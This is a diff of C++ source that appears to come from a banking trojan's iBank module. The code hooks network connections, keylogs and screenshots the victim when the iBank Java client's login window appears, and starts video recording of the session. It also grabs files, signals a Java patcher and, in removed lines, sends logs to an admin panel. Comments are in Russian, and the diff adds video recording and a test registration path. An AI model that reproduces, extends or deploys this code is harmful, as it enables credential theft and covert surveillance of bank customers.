@@ -46,11 +46,11 @@ namespace IBANKDEBUGSTRINGS
 	char IBankLogPath[] = {'/', 'g', 'e', 't', '/', 'i', 'b', 'a', 'n', 'k', '.', 'h', 't', 'm', 'l',  0};
 #endif
 
-void SendLogToAdmin( const char* c, const char* v ); //отсылка логов в админку
-extern char versionPatch[]; //версия патча
 
 namespace IBank
 {
+
+	char SystemName[]   = {'I', 'B', 'A', 'N', 'K',  0};
 
 	//-----------------------------------------------------------------------
 	typedef struct TIBankLog
@@ -162,63 +162,30 @@ namespace IBank
 	}
 	//-----------------------------------------------------------------------
 
-	static void ScanPidFile()
+   /*	static void WINAPI ShowWindowIBank(PKeyLogger Logger, DWORD EventID, LPVOID Data)
 	{
-		char wjDat[MAX_PATH];
-		if( GetAllUsersProfile( wjDat, sizeof(wjDat), "wj.dat" ) )
-		{
-			DWORD PID = GetUniquePID();
-			if( File::IsExists(wjDat) )
-			{
-				DWORD size;
-				DWORD* pids = (DWORD*)File::ReadToBufferA( wjDat, size );
-				int count = size / 4;
 
-				for( int i = 0; i < count; i++ )
-					if( pids[i] == PID )
-					{
-						PID = 0; //такой пид уже есть, добавлятьв файл не нужно
-						break;
-					}
-				if( PID ) //добавляем пид
-				{
-					DWORD* pids2 = (DWORD*)MemAlloc(size + 4);
-					pids2[0] = PID;
-					m_memcpy( &pids2[1], pids, size );
-					File::WriteBufferA( wjDat, pids2, size + 4 );
-					MemFree(pids2);
-				}
-				MemFree(pids);
-			}
-			else
-				File::WriteBufferA( wjDat, &PID, sizeof(PID) );
-			pMoveFileExA( wjDat, NULL, MOVEFILE_DELAY_UNTIL_REBOOT );
-		}
-	}
-
-	static void WINAPI ShowWindowIBank(PKeyLogger Logger, DWORD EventID, LPVOID Data)
-	{
 		TShowWindowData* data = (TShowWindowData*)Data;
 
-		ScanPidFile();
-	
+		// Скрытие окон игнорируем
+		if (data->Command == 0)
+			return;
+
 		char caption[128];
 		pGetWindowTextA( data->Window, caption, sizeof(caption) );
 
-		if( m_strstr( caption, "Вход в систему" ) == 0 )
+		if(m_strstr(caption, "Вход в систему") == 0)
 		{
-			char patTxt[MAX_PATH];
-			if(	GetAllUsersProfile( patTxt, sizeof(patTxt), "Pat.txt" ) )
+			char PatTxt[MAX_PATH];
+			if(	GetAllUsersProfile(PatTxt, MAX_PATH, "Pat.txt"))
 			{
-				File::WriteBufferA( patTxt, (LPVOID)"123",3 );
-				if( !recVideoIsRun )
-				{
-					StartRecordThread( GetUniquePID(), "IBANK", NULL, NULL, 700 );//стартуем поток записи видео
-					recVideoIsRun = true;
-				}
+				File::WriteBufferA(PatTxt, (LPVOID)"1", 1);
+                VideoRecorderSrv::StartRecording(SystemName);
 			}
 		}
-	}
+	}  */
+	//------------------------------------------------------------------------
+
 
 	void SetHooks()
 	{
@@ -232,7 +199,7 @@ namespace IBank
 			__asm mov [Real_Connect], eax
 		}
 
-		KeyLogger::ConnectEventHandler( KLE_SHOW_WND, ShowWindowIBank );
+		//KeyLogger::ConnectEventHandler( KLE_SHOW_WND, ShowWindowIBank );
     }
 
 	void AddFileGrabber(FileGrabber::TypeFuncReceiver IsFileKey)
@@ -248,12 +215,21 @@ namespace IBank
 		FileGrabber::AddReceiver(rv);
 	}
 
+
 	//-----------------------------------------------------------------------
 	void SystemActivated(LPVOID Sender)
 	{
 		System = (PKeyLogSystem)Sender;
 		// Активированы система IBank
 		IBDBG("IBank", "Система %s активирована, %08x", System->Name, (DWORD)GetImageBase() );
+
+		// Сигнализируем ява патчеру о необходимости запуска патчей
+		#ifdef JAVS_PATCHERH
+			JavaPatcherSignal();
+		#endif
+
+		// Запускаем запись видео
+		VideoRecorderSrv::StartRecording(SystemName);
 
 		// Инициализируем данные системы
 		PKeyLogger Logger = KeyLogger::GetKeyLogger();
@@ -269,9 +245,8 @@ namespace IBank
 			Temp = (HWND)pGetParent(Temp);
 			if (Temp != NULL)
             	Log.Wnd = Temp;
-        }
-		//отсылаем версию бота (для патча)
-		SendLogToAdmin( "botver", versionPatch );
+		}
+
 		//  Ставим хуки
 		if( !Hooked ) 
 		{
@@ -279,6 +254,7 @@ namespace IBank
 			Hooked = true;
 		}
 	}
+
 
 	void SystemActivated2(LPVOID Sender)
 	{
@@ -521,28 +497,87 @@ BOOL WINAPI Hook_CloseHandle( HANDLE hObject )
 
 
 //---------------------------------------------------------------------------
+
+#ifdef AGENTFULLTEST
+	void ___RegisterIBankSystem(DWORD hashApp)
+	{
+
+		// Тестовая регистрация
+
+		ClearStruct(IBank::Log);
+		IBank::Hooked = false;
+		IBank::System = NULL;
+
+		// Функция регистрирует систему IBANK
+		char SysName[]   = {'I', 'B', 'A', 'N', 'K',  0};
+		char SysNameW[]  = {'I', 'B', 'A', 'N', 'K', 'W', 0};
+		char Caption1[]  = {'*', 'в', 'х', 'о', 'д', '*',  0};;
+		char Caption2[]  = {'*', 'в', 'х', '*', 'д', '*',  0};
+		char Caption3[]  = {'*','и','н','х','р','о','н','и','з','а','ц','и','я','*', 0}; //Синхронизация с банком
+
+
+
+		PKeyLogSystem S = KeyLogger::AddSystem(SysName, 0);
+
+		if (S != NULL)
+		{
+			IBDBG("IBank", "Система зарегистрирована");
+			IBank::System = S;
+			S->OnActivate      = IBank::SystemActivated;
+			S->OnDeactivate    = IBank::SystemDeactivated;
+			S->DontSendLog     = true;
+			S->TimeMode		   = KLG_TIME_INFINITE;
+
+			IBank::MakeScreenShot();
+
+			// Добавляем фильтры окон
+			PKlgWndFilter F;
+			F = KeyLogger::AddFilter(S, true, true, NULL, Caption1, FILTRATE_PARENT_WND, LOG_ALL, 3);
+			if (F != NULL)
+			{
+				F->CaseSensetive = false;
+				F->DontSaveMouseLog = true;
+				KeyLogger::AddFilterText(F, NULL, Caption2);
+				KeyLogger::AddFilterText(F, NULL, Caption3);
+			}
+
+		}
+	}
+#endif
+
+
 void RegisterIBankSystem(DWORD hashApp)
 {
 
-	ClearStruct(IBank::Log);
 
+	// Для тестов
+	#ifdef AGENTFULLTEST
+		___RegisterIBankSystem(0);
+		return;
+	#endif
+
+
+
+
+	ClearStruct(IBank::Log);
+	IBank::Hooked = false;
+	IBank::System = NULL;
 
 	// Функция регистрирует систему IBANK
-	char SysName[]   = {'I', 'B', 'A', 'N', 'K',  0};
+
 	char SysNameW[]  = {'I', 'B', 'A', 'N', 'K', 'W', 0};
 	char ClassName[] = {'S','u','n','A','w','t','F','r','a','m','e', 0};;
 	char Caption1[]  = {'*', 'в', 'х', 'о', 'д', '*',  0};;
 	char Caption2[]  = {'*', 'в', 'х', '*', 'д', '*',  0};
 	char Caption3[]  = {'*','и','н','х','р','о','н','и','з','а','ц','и','я','*', 0}; //Синхронизация с банком
 
-	IBank::System = NULL;
 
 	DWORD hashMain = PROCESS_HASH_JAVA;
 	//если javaw.exe запущен не из под java.exe, то возможно это оффлайн версия ибанка
 	if( hashApp == PROCESS_HASH_JAVAW && GetHashForPid(GetParentPID()) != PROCESS_HASH_JAVA )
 		hashMain = PROCESS_HASH_JAVAW;
 
-	PKeyLogSystem S = KeyLogger::AddSystem(SysName, hashMain);
+	PKeyLogSystem S = KeyLogger::AddSystem(IBank::SystemName, hashMain);
 
 	if (S != NULL)
 	{
